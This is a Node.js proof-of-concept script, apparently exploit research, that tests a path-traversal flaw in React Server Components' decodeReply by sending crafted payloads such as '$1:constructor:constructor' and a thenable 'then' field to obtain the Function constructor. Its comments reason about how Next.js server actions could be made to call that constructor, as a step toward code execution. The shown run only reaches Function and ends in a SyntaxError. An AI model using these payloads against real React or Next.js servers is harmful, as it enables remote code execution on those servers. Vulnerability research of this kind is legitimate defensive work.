/**
 * Test: getOutlinedModel path traversal
 *
 * The vulnerable code:
 *   for (key = 1; key < reference.length; key++)
 *     parentObject = parentObject[reference[key]];
 *
 * With "$1:constructor:constructor":
 *   chunk[1]["constructor"]["constructor"] = Function
 *
 * This is the REAL vulnerability path - simpler than #constructor!
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: getOutlinedModel colon path traversal');
console.log('='.repeat(60));
console.log('');

async function test() {
  // The $ prefix triggers getOutlinedModel
  // $1:key:key splits on ":" and traverses each key

  console.log('[1] Testing $1:constructor:constructor');
  console.log('');

  const formData = new Map();
  // Chunk 0 references chunk 1 with path traversal
  formData.set('0', '"$1:constructor:constructor"');
  // Chunk 1 is any object (we traverse from its value)
  formData.set('1', '{"x":1}');

  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  const result = await decodeReply(formData, webpackServerMap);
  console.log('  Result:', result);
  console.log('  Result === Function:', result === Function);
  console.log('');

  console.log('[2] Testing $1:__proto__:constructor');
  console.log('');

  formData.clear();
  formData.set('0', '"$1:__proto__:constructor"');
  formData.set('1', '{"x":1}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  const result2 = await decodeReply(formData, webpackServerMap);
  console.log('  Result:', result2);
  console.log('  Result === Object:', result2 === Object);
  console.log('');

  console.log('[3] Now the critical question:');
  console.log('    We can get Function. What CALLS it with our code?');
  console.log('');

  // The result is returned to the caller of decodeReply
  // In Next.js this becomes the server action's arguments
  // The server action receives Function as an argument
  // But doesn't call it unless the action code does

  console.log('[4] Testing with .then = Function (thenable):');
  console.log('');

  formData.clear();
  formData.set('0', '{"then": "$1:constructor:constructor"}');
  formData.set('1', '{"x":1}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  const result3 = await decodeReply(formData, webpackServerMap);
  console.log('  Result:', result3);
  console.log('  Result.then:', result3.then);
  console.log('  Result.then === Function:', result3.then === Function);
  console.log('');

  // When this is awaited in Next.js:
  // boundActionArguments = await decodeReply(...)
  // The await treats result3 as thenable
  // Calls: result3.then(resolve, reject)
  // Which is: Function(resolve, reject)
  // resolve/reject are V8 native functions
  // Function("function() { [native code] }", "function() { [native code] }")
  // = SyntaxError

  console.log('[5] The SyntaxError problem:');
  console.log('    await { then: Function } calls Function(resolve, reject)');
  console.log('    resolve.toString() = "function () { [native code] }"');
  console.log('    This is not valid as a function parameter name!');
  console.log('');

  console.log('[6] Testing what actually happens:');
  console.log('');

  try {
    // Simulate what Next.js does
    const awaited = await result3;
    console.log('  Awaited result:', awaited);
  } catch (e) {
    console.log('  Error (expected):', e.message);
  }
  console.log('');
}

test().catch(console.error);
